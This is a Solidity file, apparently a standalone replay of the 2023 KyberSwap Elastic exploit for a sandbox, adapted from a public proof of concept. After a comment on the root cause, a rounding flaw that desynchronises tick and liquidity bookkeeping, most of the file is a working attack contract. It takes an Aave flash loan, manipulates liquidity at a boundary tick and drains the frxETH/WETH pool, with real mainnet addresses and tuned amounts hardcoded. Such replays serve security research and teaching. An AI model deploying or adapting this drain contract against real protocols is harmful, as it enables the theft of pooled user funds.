// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-11-KyberSwap_exp.eth.1).
// The DeFiHackLabs PoC's attack logic lives in `Exploiter`/`Logger` — Foundry
// `Test`-derived helper contracts (they `import "forge-std/Test.sol"`) that the actual
// test contract (`KyberswapFrxEthWethPoolExploitTest`) inherits from. There is no
// standalone deployable exploit contract — the flash-loan callback (`executeOperation`)
// and the pool's swap callback (`swapCallback`) both live on the test contract itself,
// and `_attacker = address(this)` is set in the `Exploiter` constructor. This is a
// faithful, self-contained copy of that inline attack (trigger + executeOperation +
// swapCallback) with the forge-std/Test dependency removed and the constructor args
// hardcoded as constants exactly as `KyberswapFrxEthWethPoolExploitTest`'s constructor
// passed them to `Exploiter` (this PoC targets exactly one pool: frxETH/WETH KS2-RT).
// Logic and constants are copied verbatim from test/KyberSwap_exp.eth.1.sol.
//
// Root cause: KyberSwap Elastic's SwapMath.calcReachAmount floors every reach-amount
// calculation (mulDivFloor), so a swap sized to land exactly on an initialized tick
// instead stops the price one wei short of that tick's sqrtP. Pool.sol's swap loop
// treats "sqrtP != nextSqrtP" (one wei short) as "did not cross" and skips applying the
// tick's liquidityNet to baseL — but still advances currentTick past the boundary via
// getTickAtSqrtRatio(sqrtP), because sqrtP moved from where the loop started. baseL and
// the tick bookkeeping are now desynchronized. A follow-up swap that re-crosses the same
// boundary tick applies that tick's liquidityNet a SECOND time, doubling the pool's
// active liquidity for free — and an exact-output swap immediately drains the pool
// against that phantom liquidity.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes memory params,
        uint16 referralCode
    ) external;
}

interface IKyberswapPool {
    function swapFeeUnits() external view returns (uint24);

    function getPoolState()
        external
        view
        returns (uint160 sqrtP, int24 currentTick, int24 nearestCurrentTick, bool locked);

    function swap(
        address recipient,
        int256 swapQty,
        bool isToken0,
        uint160 limitSqrtP,
        bytes calldata data
    ) external returns (int256 qty0, int256 qty1);
}

interface IKyberswapPositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        int24[2] ticksPrevious;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    struct RemoveLiquidityParams {
        uint256 tokenId;
        uint128 liquidity;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }

    function mint(
        MintParams calldata params
    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    function removeLiquidity(
        RemoveLiquidityParams calldata params
    ) external returns (uint256 amount0, uint256 amount1, uint256 additionalRTokenOwed);
}

contract KyberSwapDrain {
    // victim = KS2-RT (frxETH/WETH), lender = Aave v3 Pool, amount = 2,000 WETH.
    // token0 = frxETH, token1 = WETH — hardcoded exactly as the original test's
    // constructor passed them to `Exploiter` (avoids a pre-fork constructor call).
    address constant VICTIM = 0xFd7B111AA83b9b6F547E617C7601EfD997F64703;
    address constant LENDER = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant TOKEN0 = 0x5E8422345238F34275888049021821E8E08CAa1f; // frxETH
    address constant TOKEN1 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
    uint256 constant AMOUNT = 0x6c6b935b8bbd400000; // 2,000e18 WETH
    address constant MANAGER = 0xe222fBE074A436145b255442D919E4E3A6c6a480; // AntiSnipAttackPositionManager

    // entry point ////////////////////////////////////////////////////////////
    function trigger() external {
        IAavePool(LENDER).flashLoanSimple(address(this), TOKEN1, AMOUNT, "", 0);
    }

    // Aave v3 flash-loan callback ////////////////////////////////////////////
    function executeOperation(
        address, /* asset */
        uint256 amount,
        uint256 premium,
        address, /* initiator */
        bytes memory /* params */
    ) external returns (bool) {
        uint256 due = amount + premium;

        // settings
        uint24 swapFee = IKyberswapPool(VICTIM).swapFeeUnits(); // 10

        // approval is required to mint the position
        IERC20(TOKEN0).approve(MANAGER, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        IERC20(TOKEN1).approve(MANAGER, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);

        // step 1: move to a tick range with 0 liquidity
        IKyberswapPool(VICTIM).swap(address(this), int256(AMOUNT), false, 0x100000000000000000000000000, "");

        // step 2: supply liquidity straddling the boundary tick
        (, int24 currentTick, int24 nearestCurrentTick,) = IKyberswapPool(VICTIM).getPoolState();
        (uint256 tokenId,,,) = IKyberswapPositionManager(MANAGER).mint(
            IKyberswapPositionManager.MintParams(
                TOKEN0,
                TOKEN1,
                swapFee,
                currentTick,
                111_310,
                [nearestCurrentTick, nearestCurrentTick],
                6_948_087_773_336_076,
                107_809_615_846_697_233,
                0,
                0,
                address(this),
                block.timestamp
            )
        );

        // step 3: remove part of the freshly minted liquidity, leaving baseL
        // straddling the boundary tick the attacker will re-cross below
        IKyberswapPositionManager(MANAGER).removeLiquidity(
            IKyberswapPositionManager.RemoveLiquidityParams(
                tokenId, 14_938_549_516_730_950_591, 0, 0, block.timestamp
            )
        );

        // step 4: swap up — SwapMath's floored reach amount lands sqrtP one wei
        // short of the boundary tick; currentTick advances but the liquidityNet
        // cross is skipped (Pool.sol's `sqrtP != nextSqrtP` branch) — the desync
        // between baseL and the tick bookkeeping is born here
        IKyberswapPool(VICTIM).swap(
            address(this),
            387_170_294_533_119_999_999,
            false,
            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341,
            ""
        );

        // step 5: swap back down (exact output = the pool's ENTIRE WETH balance)
        // — re-crosses the same boundary tick, so its liquidityNet is applied a
        // SECOND time, doubling active liquidity; the exact-output request is then
        // filled against that phantom liquidity, draining the pool's real WETH
        IKyberswapPool(VICTIM).swap(address(this), -int256(IERC20(TOKEN1).balanceOf(VICTIM)), false, 4_295_128_740, "");

        // repay the flash loan (Aave pulls `due` via transferFrom after this returns)
        IERC20(TOKEN1).approve(LENDER, due);

        return true;
    }

    // KyberSwap swap callback ////////////////////////////////////////////////
    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata /* data */ ) external {
        if (deltaQty0 > 0) {
            IERC20(TOKEN0).transfer(msg.sender, uint256(deltaQty0));
        } else if (deltaQty1 > 0) {
            IERC20(TOKEN1).transfer(msg.sender, uint256(deltaQty1));
        }
    }
}
